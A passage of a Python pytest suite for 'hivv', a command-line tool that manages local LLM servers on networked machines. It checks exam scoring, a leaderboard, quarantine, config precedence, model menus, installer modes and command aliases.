        assert a.show is True and a.no_judge is True

    def test_heartbeat_carries_quality_score(self):
        assert '"quality_score": (st.get("exam") or {}).get("score")' in CLI_PATH.read_text()

    def test_hub_tracks_and_exposes_quality(self):
        assert "quality_score" in (REPO / "api" / "lib" / "orchestrator.js").read_text()
        assert "quality_score" in (REPO / "api" / "routes" / "control-routes.js").read_text()


# ── 30. hivv iq — intelligence + personality index + public brain board ──────
class TestIq:
    def test_iq_index_mapping_and_clamps(self):
        assert hivv._iq_index(0) == 55
        assert hivv._iq_index(100) == 135
        assert hivv._iq_index(50) == 95
        assert hivv._iq_index(-5) == 55
        assert hivv._iq_index(150) == 135
        assert hivv._iq_index(None) == 55
        assert hivv._iq_index("75") == 115

    def test_registered_and_parses(self):
        assert hivv.COMMANDS.get("iq") is hivv.cmd_iq
        assert hivv.COMMANDS.get("rate") is hivv.cmd_rate
        a = hivv.build_parser().parse_args(["iq", "--board", "--no-judge"])
        assert a.board is True and a.no_judge is True
        b = hivv.build_parser().parse_args(["rate", "masjid", "9", "--note", "great bee"])
        assert b.name == "masjid" and b.score == "9" and b.note == "great bee"

    def test_exam_save_writes_iq_and_history(self, tmp_path, monkeypatch):
        monkeypatch.setattr(hivv, "STATE_FILE", tmp_path / "state.json")
        ex = hivv._exam_save(80, {"by_cat": {"math": 20}}, {"math": "391"},
                             8080, [{"judge_avg": 8.0}],
                             personality={"joke": {"reply": "beep", "degenerate": False}})
        assert ex and ex["iq"] == hivv._iq_index(80)
        assert ex["ai_avg"] == 8.0
        assert ex["personality"]["joke"]["reply"] == "beep"
        # second take: history grows, personality is PRESERVED when not passed
        hivv._exam_save(60, {"by_cat": {}}, {}, 8080, [])
        st = json.loads((tmp_path / "state.json").read_text())
        assert len(st["iq_history"]) == 2
        assert st["iq_history"][-1] == {"ts": st["exam"]["ts"], "score": 60,
                                        "iq": hivv._iq_index(60)}
        assert st["exam"].get("personality"), "personality must survive a re-take"

    def test_battery_runs_the_whole_set_offline(self, monkeypatch):
        monkeypatch.setattr(hivv, "_local_ask",
                            lambda p, **k: (f"answer about {p[:12]}", 8080))
        monkeypatch.setattr(hivv, "_review_hive_brains", lambda *a, **k: [])
        res, ans, port = hivv._exam_battery(hivv._EXAM_QUESTIONS, no_judge=True)
        assert len(res) == 6 and len(ans) == 6 and port == 8080
        score, detail = hivv._exam_total(res)
        assert detail["unjudged"] == 3   # fuzzy ones excluded when judges are off

    def test_personality_probes_exist(self):
        assert len(hivv._PERSONALITY_Q) >= 2

    def test_public_board_and_rate_routes_exist(self):
        src = (REPO / "api" / "routes" / "honey-routes.js").read_text()
        assert "router.get('/iq'" in src
        assert "router.post('/iq/rate'" in src
        assert "human_ratings" in src

    def test_heartbeat_sends_exam_summary(self):
        assert '"exam_summary"' in CLI_PATH.read_text()
        assert "exam_summary" in (REPO / "api" / "lib" / "orchestrator.js").read_text()


# ── 31. brain board power ranking + coaching for weaker brains (2026-11-18) ──
class TestBrainBoardCli:
    def test_sort_flag_choices(self):
        a = hivv.build_parser().parse_args(["iq", "--board", "--sort", "speed"])
        assert a.sort == "speed" and a.board is True

    def test_board_engine_wired_into_hive_route(self):
        src = (REPO / "api" / "routes" / "honey-routes.js").read_text()
        assert "require('../lib/brainboard')" in src
        assert "buildBrainBoard" in src and "perf.snapshot" in src
        assert "power (v1)" in src   # the formula is published, not hidden

    def test_coach_flow_present_for_weak_scores(self):
        src = CLI_PATH.read_text()
        assert "if score < 80:" in src
        assert "asking a stronger bee for one tip" in src
        assert '"coach": (coach if coach is not None else prev.get("coach"))' in src

    def test_local_chat_death_message_guides_recovery(self):
        # the exact failure Stuarts-iMac hit: installed but nothing listening
        src = CLI_PATH.read_text()
        assert "no local LLM is LISTENING" in src
        assert "it DIED" in src and "llama-setup.log" in src


# ── 32. brain data must survive re-register + restart (2026-11-18 bug:
#        masjid's human vote was wiped by the next agent re-register) ───────
class TestBrainPersistence:
    def test_reregistration_preserves_scores_and_ratings(self):
        src = (REPO / "api" / "lib" / "orchestrator.js").read_text()
        assert "existing?.quality_score" in src
        assert "existing?.exam_summary" in src
        assert "existing?.human_ratings" in src

    def test_heartbeat_debounced_save_still_present(self):
        src = (REPO / "api" / "lib" / "orchestrator.js").read_text()
        assert "_debouncedSave()" in src

    def test_rate_route_persists_immediately(self):
        src = (REPO / "api" / "routes" / "honey-routes.js").read_text()
        assert "_debouncedSave" in src


# ── 33. lifecycle scopes (start|stop|restart all|agent|llm|ollama) ───────────
class TestLifecycleScopes:
    def test_scopes_parse_for_all_three_verbs(self):
        for verb in ("start", "stop", "restart"):
            assert hivv.build_parser().parse_args([verb]).what == "all"
            assert hivv.build_parser().parse_args([verb, "llm"]).what == "llm"
            assert hivv.build_parser().parse_args([verb, "agent"]).what == "agent"
            assert hivv.build_parser().parse_args([verb, "ollama"]).what == "ollama"

    def test_component_helper_wired_into_all_three(self):
        src = CLI_PATH.read_text()
        assert src.count("_llm_component(") >= 6   # explicit + all, ×3 verbs
        assert 'def _llm_component(what: str, action: str)' in src

    def test_setup_and_serve_record_llm_state(self):
        src = CLI_PATH.read_text()
        assert "_llm_state_set(model=model, port=port, host=host, ctx=ctx, pid=proc.pid)" in src
        assert "_llm_state_set(model=model_key, port=port, host=host, ctx=ctx_size, pid=_p.pid)" in src

    def test_llama_pid_guard_never_kills_ollama(self):
        # 'ollama' contains 'llama' — the comm guard must exclude it explicitly
        src = CLI_PATH.read_text()
        assert '"llama" in comm and "ollama" not in comm' in src


# ── 34. crash-loop quarantine (auto-stop network-side, human-only release) ──
class TestQuarantine:
    def test_flap_detector_and_auto_quarantine_in_orchestrator(self):
        src = (REPO / "api" / "lib" / "orchestrator.js").read_text()
        assert "flap_events" in src and ">= 5" in src
        assert "auto-flap" in src and "'quarantined'" in src
        assert "re-registrations within 10 minutes" in src

    def test_heartbeat_freezes_for_quarantined_nodes(self):
        src = (REPO / "api" / "lib" / "orchestrator.js").read_text()
        assert "if (node.quarantined) return node;" in src
        srv = (REPO / "api" / "server.js").read_text()
        assert "updated.quarantined" in srv

    def test_release_endpoint_and_cli(self):
        ctrl = (REPO / "api" / "routes" / "control-routes.js").read_text()
        assert "router.post('/nodes/:id/quarantine'" in ctrl
        assert "released: true" in ctrl
        assert hivv.COMMANDS.get("quarantine") is hivv.cmd_quarantine
        a = hivv.build_parser().parse_args(["quarantine", "masjid", "--release"])
        assert a.name == "masjid" and a.release is True


# ── 35. hivv security — local scan + hub analysis report ─────────────────────
class TestSecurity:
    def test_score_deductions(self):
        assert hivv._sec_score([]) == 100
        assert hivv._sec_score([{"sev": "high"}]) == 75
        assert hivv._sec_score([{"sev": "medium"}]) == 90
        assert hivv._sec_score([{"sev": "low"}]) == 96
        assert hivv._sec_score([{"sev": "high"}] * 5) == 0     # floored
        assert hivv._sec_score(None) == 100

    def test_registered_and_parses(self):
        assert hivv.COMMANDS.get("security") is hivv.cmd_security
        a = hivv.build_parser().parse_args(["security", "--no-report"])
        assert a.no_report is True

    def test_hub_security_endpoint_exists(self):
        src = (REPO / "api" / "routes" / "honey-routes.js").read_text()
        assert "router.post('/security-report'" in src
        assert "security_report" in src

    def test_scan_produces_only_actionable_findings(self):
        rep = hivv._security_scan()
        assert set(rep) >= {"score", "findings", "ports", "ts"}
        for f in rep["findings"]:
            assert f["sev"] in ("high", "medium", "low") and f["title"] and f["fix"]
        assert 0 <= rep["score"] <= 100


# ── 36. hivv history (used to fall through to CHAT) + direct-loop bounds ─────
class TestHistoryAndDirectBounds:
    def test_history_registered_and_parses(self):
        assert hivv.COMMANDS.get("history") is hivv.cmd_history
        a = hivv.build_parser().parse_args(["history", "--limit", "5"])
        assert a.limit == 5

    def test_history_is_never_a_chat_message(self):
        # the smart-default trap: 'hivv history' must resolve to a COMMAND
        src = CLI_PATH.read_text()
        assert '"history":         "cmd_history"' in src

    def test_direct_chat_payload_is_bounded_and_penalized(self):
        # the runaway 'row row row…ogas ogas' loop: direct loop sent FULL-CTX
        # max_tokens with no repeat penalty — both paths must carry the guard
        src = CLI_PATH.read_text()
        assert src.count('"repeat_penalty": 1.1') >= 2
        assert 'HIVV_LOCAL_MAX_TOKENS' in src


# ── 37. hivv llm doctor — diagnosis + safe auto-fix ──────────────────────────
class TestLlmDoctor:
    def test_registered_and_parses(self):
        assert hivv.COMMANDS.get("llm doctor") is hivv.cmd_llm_doctor
        a = hivv.build_parser().parse_args(["llm", "doctor", "--fix"])
        assert a.fix is True

    def test_diagnose_known_failure_signatures(self):
        cases = {
            "Error: address already in use": "port-conflict",
            "invalid magic in model file": "corrupt-model",
            "failed to load model": "load-failed",
            "errno 28 no space left on device": "disk-full",
            "std::bad_alloc": "oom",
            "cannot mmap": "mmap-failed",
            "unknown model architecture type": "wrong-arch",
        }
        for text, fid in cases.items():
            ids = [f["id"] for f in hivv._llm_diagnose(text)]
            assert fid in ids, f"{fid} not diagnosed from {text!r}"

    def test_diagnose_clean_and_empty(self):
        assert hivv._llm_diagnose("") == []
        assert hivv._llm_diagnose("llama server started, all slots idle, no errors") == []

    def test_every_finding_has_an_actionable_fix(self):
        for f in hivv._llm_diagnose("address already in use"):
            assert f["fix"] and "{APP}" in f["fix"]


# ── 38. install command must steer to llama.cpp (2026-11-18: user ran
#        `hivv llm install --auto` expecting llama.cpp, got brew/ollama) ─────
class TestLlmInstallGuidance:
    def test_plain_install_recommends_llama_cpp_first(self):
        src = CLI_PATH.read_text()
        i_llama = src.find("Recommended — llama.cpp")
        i_ollama_alt = src.find("Alternatives (ollama):")
        assert i_llama != -1 and i_ollama_alt != -1
        assert i_llama < i_ollama_alt, "llama.cpp must come BEFORE ollama"

    def test_ollama_auto_path_labels_itself(self):
        src = CLI_PATH.read_text()
        assert "this installs OLLAMA — for the hive's default path use" in src
        assert "llm install-llama --auto)" in src

    def test_llm_doctor_patterns_have_ids(self):
        # the 3-vs-4 tuple unpack crash (ValueError at _llm_diagnose)
        for entry in hivv._LLAMA_LOG_PATTERNS:
            assert len(entry) == 4
        ids = [e[1] for e in hivv._LLAMA_LOG_PATTERNS]
        assert "oom" in ids and "port-conflict" in ids


# ── 39. launcher quality flags + proven gemma-4 catalog + stop fallback ──────
class TestLauncherAndCatalog:
    def test_np_capped_at_four(self, monkeypatch):
        monkeypatch.setattr(hivv.os, "cpu_count", lambda: 20)   # iMac Pro
        args = hivv._llm_extra_args()
        assert args[args.index("-np") + 1] == "4"

    def test_np_env_override(self, monkeypatch):
        monkeypatch.setenv("HIVV_LLM_NP", "8")
        assert "-np" in hivv._llm_extra_args() and "8" in hivv._llm_extra_args()

    def test_metal_offload_only_on_darwin(self, monkeypatch):
        monkeypatch.setattr(hivv.sys, "platform", "linux")
        assert "-ngl" not in hivv._llm_extra_args()
        monkeypatch.setattr(hivv.sys, "platform", "darwin")
        assert "-ngl" in hivv._llm_extra_args()

    def test_catalog_has_proven_gemma4_entry(self):
        e = hivv._GGUF_MODELS["gemma-4:e2b"]
        assert e["repo"] == "unsloth/gemma-4-E2B-it-GGUF"
        assert e["file"] == "gemma-4-E2B-it-Q4_K_M.gguf"
        assert abs(e["size_gb"] - 2.89) < 0.01   # verified via HF HEAD (200, exact bytes)

    def test_mislabeled_gemma4_key_documented(self):
        # the key says gemma4 but the model is gemma-3-4b — must stay visible
        assert "GEMMA-3" in hivv._GGUF_MODELS["gemma4:e2b"]["desc"]

    def test_stop_falls_back_to_known_ports_without_state(self):
        src = CLI_PATH.read_text()
        assert 'for p in (8080, 8090, 8081, 8082):' in src


# ── 40. `hivv llm restart` must restart, never chat (2026-11-18: the inverted
#        form fell into the smart-default and talked to the dying server) ─────
class TestLlmLifecycleAliases:
    def test_inverted_forms_are_redirected(self):
        src = CLI_PATH.read_text()
        assert 'if cmd_name in ("llm start", "llm stop", "llm restart"):' in src
        assert "argv = [_verb, _scope] + list(argv[2:])" in src

    def test_scoped_forms_still_parse(self):
        for verb in ("start", "stop", "restart"):
            a = hivv.build_parser().parse_args([verb, "llm"])
            assert a.what == "llm"

    def test_llm_restart_is_never_in_commands_as_chat(self):
        # "llm restart" as a COMMAND name must not exist (it's rewritten first)
        assert "llm restart" not in hivv.COMMANDS


# ── 41. hivv llm config — persistent llama.cpp/ollama settings + GPU bisect ─
class TestLlmConfig:
    def test_registered_and_parses(self):
        assert hivv.COMMANDS.get("llm config") is hivv.cmd_llm_config
        a = hivv.build_parser().parse_args(
            ["llm", "config", "--set", "np=6", "--set", "ngl=0", "--unset", "ctx"])
        assert a.set == ["np=6", "ngl=0"] and a.unset == ["ctx"]

    def test_set_unset_roundtrip(self, tmp_path, monkeypatch):
        monkeypatch.setattr(hivv, "_LLM_CONFIG_FILE", str(tmp_path / "c.json"))
        assert hivv._llm_config_set(["np=6", "host=0.0.0.0"]) == []
        cfg = hivv._llm_config()
        assert cfg["np"] == 6 and cfg["host"] == "0.0.0.0"
        assert hivv._llm_config_unset(["np"]) == []
        assert "np" not in hivv._llm_config() and "host" in hivv._llm_config()

    def test_validation_rejects_bad_keys_and_values(self, tmp_path, monkeypatch):
        monkeypatch.setattr(hivv, "_LLM_CONFIG_FILE", str(tmp_path / "c.json"))
        assert "unknown key" in hivv._llm_config_set(["bogus=1"])[0]
        assert hivv._llm_config_set(["np=abc"])            # int parse
        assert hivv._llm_config_set(["port=0"])            # min 1
        assert hivv._llm_config_set(["ngl=0"]) == []       # 0 = force CPU is LEGAL
        assert hivv._llm_config_set(["ctx=-5"])            # negative ctx

    def test_extra_args_full_precedence(self, monkeypatch):
        monkeypatch.setattr(hivv, "_llm_config",
                            lambda: {"ngl": 12, "np": 8, "threads": 2,
                                     "extra": "--cache-reuse 3", "api_key": "s3k"})
        monkeypatch.setattr(hivv.sys, "platform", "darwin")
        monkeypatch.setenv("HIVV_LLM_NGL", "0")   # config must beat env
        a = hivv._llm_extra_args()
        assert a[a.index("-ngl") + 1] == "12"
        assert a[a.index("-np") + 1] == "8"
        assert a[a.index("-t") + 1] == "2"
        assert "--api-key" in a and "s3k" in a
        assert "--cache-reuse" in a and "3" in a

    def test_env_ngl_is_the_metal_bisect(self, monkeypatch):
        # HIVV_LLM_NGL=0 hivv restart llm → CPU path (the 10-second test
        # separating 'Metal build bug' from 'model/file bug')
        monkeypatch.setattr(hivv, "_llm_config", lambda: {})
        monkeypatch.setattr(hivv.sys, "platform", "darwin")
        monkeypatch.setenv("HIVV_LLM_NGL", "0")
        a = hivv._llm_extra_args()
        assert a[a.index("-ngl") + 1] == "0"

    def test_config_file_written_0600(self, tmp_path, monkeypatch):
        monkeypatch.setattr(hivv, "_LLM_CONFIG_FILE", str(tmp_path / "c.json"))
        hivv._llm_config_set(["api_key=sek"])
        mode = (tmp_path / "c.json").stat().st_mode & 0o777
        assert mode == 0o600


# ── 42. model menu (small <3B choice incl. Meta/facebook) + swap-on-garbage ──
class TestModelChoiceAndSwap:
    def test_menu_groups_small_first_with_families(self):
        m = hivv._gguf_menu()
        assert 0 < m.find("small (<3B)") < m.find("medium")
        for k in ("qwen3:0.6b", "qwen3:1.7b", "llama-3.2:1b",
                  "llama-3.2:3b", "gemma-1b"):
            assert k in m, f"{k} missing from menu"
        assert "facebook" in m and "Meta" in m
        assert "llm setup --model" in m and "llm suggest" in m

    def test_menu_keys_exist_in_catalog(self):
        m = hivv._gguf_menu()
        for k in ("qwen3:0.6b", "qwen3:1.7b", "llama-3.2:1b", "llama-3.2:3b", "gemma-1b"):
            assert f"  {k:<14}" in m and k in hivv._GGUF_MODELS

    def test_compact_menu_is_one_line(self):
        c = hivv._gguf_menu(compact=True)
        assert "\n" not in c and "qwen3:1.7b" in c and "llama-3.2:3b" in c

    def test_swap_hint_prefers_proven_model(self):
        h = hivv._model_swap_hint("gemma4:e2b")     # their looping model
        assert "setup --model gemma-4:e2b" in h     # hive-proven first
        assert "stop llm &&" in h and "llm suggest" in h

    def test_swap_hint_never_suggests_the_same_model(self):
        h = hivv._model_swap_hint("gemma-4:e2b")
        assert "setup --model gemma-4:e2b" not in h
        assert "setup --model qwen3:1.7b" in h

    def test_every_degeneracy_site_offers_the_swap(self):
        src = CLI_PATH.read_text()
        assert src.count("_model_swap_hint(") >= 6   # def +5 call sites

    def test_pull_surfaces_the_menu(self):
        src = CLI_PATH.read_text()
        assert src.count("_gguf_menu()") >= 3        # missing/unknown-model dies
        assert "pick one:" in src


# ── 43. AI fast path: self-describing command index + pure-JSON outputs ─────
class TestCommandsIndex:
    def test_json_index_is_complete_and_true(self, capsys):
        from argparse import Namespace
        hivv.cmd_commands(Namespace(json_output=True))
        data = json.loads(capsys.readouterr().out)
        assert data["app"] == hivv.APP and data["count"] >= 40
        names = {c["command"] for c in data["commands"]}
        assert {"chat", "nodes", "speeds", "history", "iq", "rate",
                "security", "quarantine", "commands"} <= names
        assert "restart" in names
        llm = next(c for c in data["commands"] if c["command"] == "llm")
        assert {"setup", "doctor", "config", "detect"} <= set(llm["subcommands"])
        chat = next(c for c in data["commands"] if c["command"] == "chat")
        assert any("--mode" in f["flag"] for f in chat["flags"])
        for c in data["commands"]:
            assert {"command", "help", "flags", "args", "subcommands"} <= set(c)

    def test_pretty_mode_still_shows_the_map(self, capsys):
        from argparse import Namespace
        hivv.cmd_commands(Namespace(json_output=False))
        out = capsys.readouterr().out
        assert "chat" in out and "commands --json" in out and "/mcp" in out


class TestPureJsonOutputs:
    def test_security_json_is_pure_stdout(self, capsys):
        from argparse import Namespace
        hivv.cmd_security(Namespace(json_output=True, no_report=True))
        out = capsys.readouterr().out
        data = json.loads(out)                 # must parse as-is: no banner lines
        assert 0 <= data["scan"]["score"] <= 100
        assert data["report"] is None          # --no-report honored

    def test_config_json_is_pure_stdout(self, monkeypatch, capsys, tmp_path):
        from argparse import Namespace
        monkeypatch.setattr(hivv, "_LLM_CONFIG_FILE", str(tmp_path / "c.json"))
        hivv._llm_config_set(["np=6"])
        hivv.cmd_llm_config(Namespace(json_output=True, set=[], unset=[]))
        data = json.loads(capsys.readouterr().out)
        assert data["config"]["np"] == 6 and "effective" in data

    def test_benchmark_json_progress_goes_to_stderr(self, monkeypatch, capsys):
        from argparse import Namespace
        def fake_http(method, path, **kw):
            if path.startswith("/api/hive/perf"):
                return 200, {"samples": []}
            return 200, {"nodes": [{"status": "online", "name": "masjid",
                                    "id": "masjid", "lan_ip": "192.0.2.9",
                                    "local_models": [{"provider": "llama.cpp", "port": 8080}]}],
                         "online": 1, "total": 1}
        monkeypatch.setattr(hivv, "http", fake_http)
        monkeypatch.setattr(hivv, "_tcp_ok", lambda *a, **k: False)
        hivv.cmd_benchmark(Namespace(json_output=True))
        cap = capsys.readouterr()
        data = json.loads(cap.out)             # stdout = JSON ONLY
        assert data["unreachable"] == ["masjid"]
        assert "hub-measured" in cap.err       # progress/hints → stderr

    def test_iq_board_json(self, monkeypatch, capsys):
        from argparse import Namespace
        payload = {"brains": [{"name": "ashy", "iq": 135, "power": 112}],
                   "count": 1, "formula": "power = IQ × speed"}
        monkeypatch.setattr(hivv, "http", lambda *a, **k: (200, payload))
        hivv.cmd_iq(Namespace(board=True, show=False, no_judge=False,
                              sort="power", json_output=True))
        data = json.loads(capsys.readouterr().out)
        assert data["brains"][0]["iq"] == 135
        assert data["brains"][0]["power"] == 112 and "formula" in data

    def test_exam_show_json(self, monkeypatch, capsys, tmp_path):
        from argparse import Namespace
        monkeypatch.setattr(hivv, "STATE_FILE", tmp_path / "state.json")
        hivv._exam_save(80, {"by_cat": {"math": 20}}, {"math": "391"}, 8080, [])
        hivv.cmd_exam(Namespace(show=True, no_judge=False, json_output=True))
        data = json.loads(capsys.readouterr().out)
        assert data["score"] == 80 and data["iq"] == hivv._iq_index(80)


# ── 44. install modes: system-wide AND user-local both honest + working ─────
class TestInstallModes:
    @staticmethod
    def _installer():
        return (REPO / "public_html" / "install-hivv.sh").read_text()

    def test_labels_key_on_prefix_not_sudo(self):
        # the old label said "user-local" while installing into /usr/local
        src = self._installer()
        assert '[[ "$PREFIX" == "$HOME/.local"' in src
        assert "SHARED: every user on this machine can run" in src
        assert 'HIVV_INSTALL_LABEL="user-local (just for you)"' in src
        assert 'HIVV_INSTALL_LABEL="SYSTEM-WIDE (helps everyone)"' in src

    def test_system_service_runs_as_the_invoking_user(self):
        # system-wide must NOT become root's state: unit pins User+HOME
        src = self._installer()
        assert 'RUN_USER="${SUDO_USER:-$(id -un)}"' in src
        assert "User=$RUN_USER" in src
        assert "Environment=HOME=$RUN_HOME" in src
        assert "/etc/systemd/system/${APP}-agent.service" in src

    def test_mac_service_is_per_user_launchagent(self):
        src = self._installer()
        assert "launchctl bootstrap" in src
        assert "Library/LaunchAgents" in src and "KeepAlive" in src

    def test_user_prefix_gets_path_and_service_guidance(self):
        src = self._installer()
        # PATH auto-added for ~/.local/bin installs (zsh/bash/fish covered)
        assert 'RC_FILE="$HOME/.zshrc"' in src and 'RC_FILE="$HOME/.bashrc"' in src
        assert 'export PATH="%s:$PATH"' in src
        # no-service install still tells the user how to autostart
        assert "WITH_SERVICE=0" in src
        assert "doctor --fix" in src

    def test_state_is_always_per_user_in_both_modes(self):
        src = self._installer()
        assert '$HOME" ".local" "$APP"' in src or ".local/share" in src
        assert "state     %s%s/%s/share/%s" in src


# ── 45. config must ACTUALLY apply (2026-11-18: _llm_extra_args shipped as
#        dead code + non-None parser defaults made ctx/port/host dead too —
#        Stuarts-iMac had to hand-patch the installed CLI) ────────────────────
class TestConfigActuallyApplies:
    def test_every_launch_site_calls_extra_args(self):
        src = CLI_PATH.read_text()
        assert src.count('"--port", str(port)] + _llm_extra_args()') >= 3
        assert '"-np", str(os.cpu_count' not in src, "hardcoded -np regressed"

    def test_config_beats_stale_state_everywhere(self):
        src = CLI_PATH.read_text()
        for pat in ('cfg.get("model") or llm.get("model")',
                    'cfg.get("port") or llm.get("port")',
                    'cfg.get("host") or llm.get("host")',
                    'cfg.get("ctx") or llm.get("ctx")'):
            assert pat in src, f"missing config-first resolver: {pat}"

    def test_parser_defaults_none_so_config_can_win(self):
        # a non-None argparse default ALWAYS beats `arg or cfg` — that made
        # `llm config --set ctx=…` silently dead for setup/serve
        a = hivv.build_parser().parse_args(["llm", "setup"])
        assert (a.model, a.port, a.ctx, a.host) == (None, None, None, None)
        s = hivv.build_parser().parse_args(["llm", "serve-llama", "m"])
        assert (s.port, s.ctx, s.host) == (None, None, None)

    def test_explicit_flags_still_beat_config(self):
        b = hivv.build_parser().parse_args(
            ["llm", "setup", "--port", "9090", "--ctx", "8192", "--host", "0.0.0.0"])
        assert (b.port, b.ctx, b.host) == (9090, 8192, "0.0.0.0")

    def test_extra_args_applies_their_working_config(self, monkeypatch):
        # the exact file that fixed their box: ngl=0, np=4
        monkeypatch.setattr(hivv, "_llm_config",
                            lambda: {"ngl": 0, "np": 4, "ctx": 16384,
                                     "extra": "--no-cache-prompt"})
        a = hivv._llm_extra_args()
        assert a[a.index("-ngl") + 1] == "0"
        assert a[a.index("-np") + 1] == "4"
        assert "--no-cache-prompt" in a


# ── 46. hivv selftest — local battery + signed REMOTE op (no generic shell) ──
class TestSelftest:
    def test_registered_and_parses(self):
        assert hivv.COMMANDS.get("selftest") is hivv.cmd_selftest
        a = hivv.build_parser().parse_args(
            ["selftest", "masjid", "--wait", "30", "--json"])
        assert a.node == "masjid" and a.wait == 30 and a.json_output is True

    def test_op_allowlisted_on_both_sides(self):
        assert "selftest" in hivv.REPAIR_OPS
        hub = (REPO / "api" / "routes" / "control-routes.js").read_text()
        assert "'selftest'" in hub.split("REPAIR_OPS = new Set(")[1].split(")")[0]

    def test_battery_structure_and_state_save(self, monkeypatch, tmp_path):
        monkeypatch.setattr(hivv, "STATE_FILE", tmp_path / "state.json")
        hivv.write_state({"last_heartbeat": int(time.time() * 1000), "pid": 4242})
        monkeypatch.setattr(hivv, "_local_llm_ports", lambda: [8080])
        monkeypatch.setattr(hivv, "_llm_alive_port", lambda p: True)
        monkeypatch.setattr(hivv, "_local_ask",
                            lambda *a, **k: ("OK", 8080))
        monkeypatch.setattr(hivv, "_llm_config", lambda: {"np": 4, "ngl": 0})
        monkeypatch.setattr(hivv, "read_pid", lambda: 4242)
        rep = hivv._selftest_run()
        ids = {c["id"] for c in rep["checks"]}
        assert {"llm-listening", "llm-config", "model-file",
                "chat-sanity", "disk", "agent"} <= ids
        assert rep["ok"] is True
        assert "OK" in next(c["detail"] for c in rep["checks"]
                            if c["id"] == "chat-sanity")
        saved = json.loads((tmp_path / "state.json").read_text())
        assert saved["selftest"]["ok"] is True      # rides the heartbeat

    def test_agent_check_accepts_seconds_heartbeat(self, monkeypatch, tmp_path):
        # the REAL agent stores last_heartbeat in SECONDS — a ms assumption made
        # every box report a "56 years ago" heartbeat (hivv test caught it)
        monkeypatch.setattr(hivv, "STATE_FILE", tmp_path / "state.json")
        hivv.write_state({"last_heartbeat": int(time.time()), "pid": 4242})
        monkeypatch.setattr(hivv, "_local_llm_ports", lambda: [])
        monkeypatch.setattr(hivv, "_llm_config", lambda: {})
        monkeypatch.setattr(hivv, "read_pid", lambda: 4242)
        rep = hivv._selftest_run()
        agent = next(c for c in rep["checks"] if c["id"] == "agent")
        assert agent["ok"] is True, agent["detail"]
        assert "years" not in agent["detail"] and "56" not in agent["detail"]

    def test_agent_check_still_normalizes_ms_heartbeats(self, monkeypatch, tmp_path):
        monkeypatch.setattr(hivv, "STATE_FILE", tmp_path / "state.json")
        hivv.write_state({"last_heartbeat": int(time.time() * 1000), "pid": 4242})
        monkeypatch.setattr(hivv, "_local_llm_ports", lambda: [])
        monkeypatch.setattr(hivv, "_llm_config", lambda: {})
        monkeypatch.setattr(hivv, "read_pid", lambda: 4242)
        rep = hivv._selftest_run()
        agent = next(c for c in rep["checks"] if c["id"] == "agent")
        assert agent["ok"] is True, agent["detail"]

    def test_degenerate_reply_fails_the_battery(self, monkeypatch, tmp_path):
        monkeypatch.setattr(hivv, "STATE_FILE", tmp_path / "state.json")
        hivv.write_state({"last_heartbeat": int(time.time() * 1000)})
        monkeypatch.setattr(hivv, "_local_llm_ports", lambda: [8080])
        monkeypatch.setattr(hivv, "_llm_alive_port", lambda p: True)
        monkeypatch.setattr(hivv, "_local_ask",
                            lambda *a, **k: ("okokokokokokok okokokok", 8080))
        monkeypatch.setattr(hivv, "_llm_config", lambda: {})
        monkeypatch.setattr(hivv, "read_pid", lambda: 4242)
        rep = hivv._selftest_run()
        assert rep["ok"] is False          # the Metal-garbage detector works
        chat = next(c for c in rep["checks"] if c["id"] == "chat-sanity")
        assert chat["ok"] is False

    def test_result_carried_by_heartbeat_and_exposed(self):
        cli = CLI_PATH.read_text()
        assert '"selftest": st.get("selftest")' in cli
        orch = (REPO / "api" / "lib" / "orchestrator.js").read_text()
        assert "node.selftest = {" in orch
        ctrl = (REPO / "api" / "routes" / "control-routes.js").read_text()
        assert "selftest: n.selftest" in ctrl


# ── 47. install architecture rethink — root|user one-command onboarding ──────
class TestInstallModeArchitecture:
    @staticmethod
    def _inst():
        return (REPO / "public_html" / "install-hivv.sh").read_text()

    def test_mode_flag_exists_and_validates(self):
        src = self._inst()
        assert 'HIVV_MODE="${1#*=}"' in src
        assert '"--mode must be auto, system or user' in src
        assert "--mode=X" in src          # documented in the help block

    def test_user_mode_always_gets_a_service(self):
        # the rethink: user installs used to skip the service → 2-step onboarding
        src = self._inst()
        i = src.find('case "$HIVV_MODE" in')
        assert i != -1, "mode case block missing"
        block = src[i:src.find("auto) ;;", i)]
        assert "user)" in block and "WITH_SERVICE=1" in block
        assert 'PREFIX="$HOME/.local"' in block

    def test_system_mode_requires_sudo_or_root(self):
        import re
        block = re.search(r"system\)\n(.*?);;", self._inst(), re.S)
        assert block, "system) mode block missing"
        assert "--mode=system needs sudo" in block.group(1)
        assert "WITH_SERVICE=1" in block.group(1)

    def test_root_sudo_curl_path_gets_a_systemd_unit(self):
        # the found bug: branch required $SUDO non-empty — `sudo curl|bash`
        # (already root) silently installed NO service
        assert '{ [[ -n "$SUDO" ]] || [[ "$EUID" -eq 0 ]]; }' in self._inst()

    def test_linux_user_unit_full_path(self):
        src = self._inst()
        assert "systemd/user/${APP}-agent.service" in src
        assert "WantedBy=default.target" in src
        # enable --now NEVER restarts a RUNNING service — the old agent kept
        # executing the old copy for 23h after a successful install (wahi).
        # The contract is now: enable, then START-or-RESTART depending on
        # whether an agent was already live.
        assert "was_active=1" in src
        assert "systemctl --user restart ${APP}-agent.service" in src
        assert "systemctl --user start ${APP}-agent.service" in src
        assert "enable-linger" in src

    def test_darwin_root_targets_the_real_user(self):
        src = self._inst()
        assert 'RUN_HOME="$(eval echo ~"$SUDO_USER"' in src
        assert 'gui/$(id -u "$RUN_USER")' in src

    def test_network_proof_gate_verifies_registration(self):
        # "on the network" must be PROVEN (healthcheck carries node_id only
        # after a successful register), not assumed
        src = self._inst()
        assert "your node is ON the network" in src
        assert '"node_id":"[^"]*"' in src
        assert "HIVV_JOINED" in src



class TestFeedbackAliases:
    def test_aliases_rewrite_before_smart_default(self):
        src = CLI_PATH.read_text()
        i_smart = src.find("# Smart default: if argv[0] doesn't match")
        i_alias = src.find('if cmd_name == "report":')
        assert i_alias != -1 and i_smart != -1 and i_alias < i_smart, \
            "feedback aliases must run BEFORE the chat fallback"
        assert 'cmd_name = "submit"' in src and 'cmd_name = "request"' in src

    def test_report_and_suggest_are_not_chatable_commands(self):
        # they're rewritten pre-dispatch — never registered as chat fallbacks
        assert "report" not in hivv.COMMANDS
        assert "suggest" not in hivv.COMMANDS
        assert "llm suggest" in hivv.COMMANDS   # the dotted one still exists

    def test_no_arg_forms_show_chooser_not_usage_die(self):
        src = CLI_PATH.read_text()
        assert 'send a problem report to the hub' in src
        assert 'send a suggestion/idea to the hub' in src
        assert "llm suggest             which model fits THIS hardware" in src

